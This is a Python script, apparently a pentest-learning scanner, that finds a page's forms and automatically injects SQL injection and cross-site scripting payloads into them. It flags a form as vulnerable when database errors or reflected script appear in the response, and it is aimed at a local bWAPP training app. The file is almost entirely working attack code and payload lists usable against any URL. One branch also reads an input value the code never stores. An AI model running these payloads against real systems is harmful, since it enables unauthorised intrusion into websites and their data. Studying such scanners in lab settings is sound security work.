import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Enhanced SQL Injection payloads
sqli_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1 /*",
    "' OR '1'='1' #",
    "' OR 1=1 #",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 'a'='a' /*",
    "' OR 'a'='a' #",
    "' OR 1=1 LIMIT 1 --",
    "' OR 1=1 LIMIT 1 #",
    "' OR '1'='1' OR ''='",
    "' OR '1'='1' OR ''='--",
    "' OR '1'='1' OR ''='/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR '1'='1' OR 'a'='a",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "1' OR 1=1 --",
    "1' OR 1=1 /*",
    "1' OR 'a'='a",
    "1' OR 'a'='a' --",
    "1' OR 'a'='a' /*",
    "1' OR 'a'='a' #"
]

# XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<marquee onstart=alert('XSS')>"
]

def get_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup.find_all('form')

def form_details(form):
    details = {}
    action = form.attrs.get('action')
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    for input_tag in form.find_all(['input', 'textarea', 'select']):
        input_type = input_tag.attrs.get('type', 'text')
        input_name = input_tag.attrs.get('name')
        if input_name:
            inputs.append({'type': input_type, 'name': input_name})
    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def is_vulnerable_to_sqli(response):
    errors = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "sql syntax error"
    ]
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def is_vulnerable_to_xss(response):
    xss_markers = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<marquee onstart=alert('XSS')>"
    ]
    for marker in xss_markers:
        if marker in response.content.decode():
            return True
    return False

def scan_sql(url):
    for payload in sqli_payloads:
        new_url = f"{url}{payload}"
        res = requests.get(new_url)
        if is_vulnerable_to_sqli(res):
            print(f"SQLi vulnerability detected in form: {url} with payload: {payload}")
            return

    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        details = form_details(form)
        for payload in sqli_payloads:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag.get("value"):
                    data[input_tag["name"]] = input_tag["value"] + payload
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"test{payload}"
            target_url = urljoin(url, details["action"])
            if details["method"] == "post":
                res = requests.post(target_url, data=data)
            elif details["method"] == "get":
                res = requests.get(target_url, params=data)
            if is_vulnerable_to_sqli(res):
                print(f"SQLi vulnerability detected in form: {details} with payload: {payload}")
                return

    print("[-] No SQL Injection vulnerabilities detected.")

def scan_xss(url):
    forms = get_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in xss_payloads:
            data = {}
            for input_tag in details['inputs']:
                if input_tag['type'] == 'text':
                    data[input_tag['name']] = payload
                else:
                    data[input_tag['name']] = input_tag.get('value')
            if details['method'] == 'post':
                res = requests.post(urljoin(url, details['action']), data=data)
            else:
                res = requests.get(urljoin(url, details['action']), params=data)
            if is_vulnerable_to_xss(res):
                print(f"XSS vulnerability detected in form: {details} with payload: {payload}")
                break  # Stop after finding a vulnerability in a form

if __name__ == "__main__":
    urlsql = "http://localhost/bWAPP/sqli_1.php"  # Replace with the target URL
    print("Scanning for SQL Injection...")
    scan_sql(urlsql)
    #urlxss = "https://vulnerable-website.com/blog"
    #print("\nScanning for XSS...")
   # scan_xss(urlxss)
